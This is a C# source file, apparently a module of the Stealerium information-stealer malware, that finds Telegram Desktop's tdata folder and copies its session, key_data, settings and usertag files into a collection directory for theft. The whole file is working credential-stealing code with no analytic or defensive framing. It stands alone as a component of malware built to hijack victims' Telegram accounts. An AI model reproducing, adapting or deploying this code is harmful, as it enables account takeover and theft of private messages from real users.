using System;
using System.Diagnostics;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Target.Messengers
{
    internal sealed class Telegram
    {
        // Get tdata directory
        private static string GetTdata()
        {
            var telegramDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                      "\\Telegram Desktop\\tdata";
            var telegramProcesses = Process.GetProcessesByName("Telegram");

            if (telegramProcesses.Length == 0)
                return telegramDesktopPath;
            return Path.Combine(
                Path.GetDirectoryName(
                    ProcessList.ProcessExecutablePath(
                        telegramProcesses[0])), "tdata");
        }

        public static bool GetTelegramSessions(string sSaveDir)
        {
            var telegramDesktopPath = GetTdata();
            try
            {
                if (!Directory.Exists(telegramDesktopPath))
                    return false;

                Directory.CreateDirectory(sSaveDir);

                // Get all directories
                var directories = Directory.GetDirectories(telegramDesktopPath);
                var files = Directory.GetFiles(telegramDesktopPath);

                // Copy directories
                foreach (var dir in directories)
                {
                    var name = new DirectoryInfo(dir).Name;
                    if (name.Length != 16) continue;
                    var copyTo = Path.Combine(sSaveDir, name);
                    Filemanager.CopyDirectory(dir, copyTo);
                }

                // Copy files
                foreach (var file in files)
                {
                    var finfo = new FileInfo(file);
                    var name = finfo.Name;
                    var copyTo = Path.Combine(sSaveDir, name);
                    // Check file size
                    if (finfo.Length > 5120)
                        continue;
                    // Copy session files
                    if (name.EndsWith("s") && name.Length == 17)
                    {
                        finfo.CopyTo(copyTo);
                        continue;
                    }

                    // Copy required files
                    if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data"))
                        finfo.CopyTo(copyTo);
                }

                Counter.Telegram = true;
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}